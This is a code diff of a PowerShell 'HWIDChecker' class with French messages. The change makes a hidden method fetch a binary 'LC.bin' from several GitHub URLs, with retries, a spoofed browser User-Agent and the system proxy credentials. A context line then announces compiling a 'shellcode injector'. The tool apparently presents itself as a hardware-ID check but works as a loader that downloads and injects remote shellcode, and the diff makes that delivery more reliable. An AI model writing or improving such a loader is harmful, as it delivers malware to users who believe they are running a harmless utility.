@@ -50,32 +50,46 @@ class HWIDChecker {
     hidden [void]ExecutePowerShellScript() {
         try {
             Write-Host "Telechargement de LC.bin..." -ForegroundColor Yellow
-            $url = "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin"
+            $urls = @(
+                "https://github.com/thegoatofapi/mth/releases/download/LC2/LC.bin",
+                "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/LC.bin"
+            )
             $maxRetries = 3
             $retryDelay = 2
             $s = $null
             
-            for ($i = 1; $i -le $maxRetries; $i++) {
-                try {
-                    $client = New-Object System.Net.WebClient
-                    $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-                    $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
-                    $client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
-                    $s = $client.DownloadData($url)
-                    Write-Host "LC.bin telecharge: $($s.Length) bytes" -ForegroundColor Green
-                    break
-                }
-                catch {
-                    if ($i -eq $maxRetries) {
-                        throw
+            foreach ($url in $urls) {
+                Write-Host "Essai avec: $url" -ForegroundColor Cyan
+                for ($i = 1; $i -le $maxRetries; $i++) {
+                    try {
+                        $client = New-Object System.Net.WebClient
+                        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+                        $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
+                        $client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
+                        $s = $client.DownloadData($url)
+                        Write-Host "LC.bin telecharge depuis $url : $($s.Length) bytes" -ForegroundColor Green
+                        break
                     }
-                    Write-Host "Tentative $i/$maxRetries echouee, nouvelle tentative dans $retryDelay secondes..." -ForegroundColor Yellow
-                    Start-Sleep -Seconds $retryDelay
+                    catch {
+                        if ($i -eq $maxRetries) {
+                            Write-Host "Echec avec $url apres $maxRetries tentatives" -ForegroundColor Red
+                            if ($url -eq $urls[-1]) {
+                                throw "Impossible de telecharger LC.bin depuis toutes les URLs"
+                            }
+                        }
+                        else {
+                            Write-Host "Tentative $i/$maxRetries echouee, nouvelle tentative dans $retryDelay secondes..." -ForegroundColor Yellow
+                            Start-Sleep -Seconds $retryDelay
+                        }
+                    }
+                }
+                if ($null -ne $s) {
+                    break
                 }
             }
             
             if ($null -eq $s) {
-                throw "Impossible de telecharger LC.bin apres $maxRetries tentatives"
+                throw "Impossible de telecharger LC.bin"
             }
             Write-Host "Compilation du shellcode injector..." -ForegroundColor Yellow
             $p = New-Object Microsoft.CSharp.CSharpCodeProvider
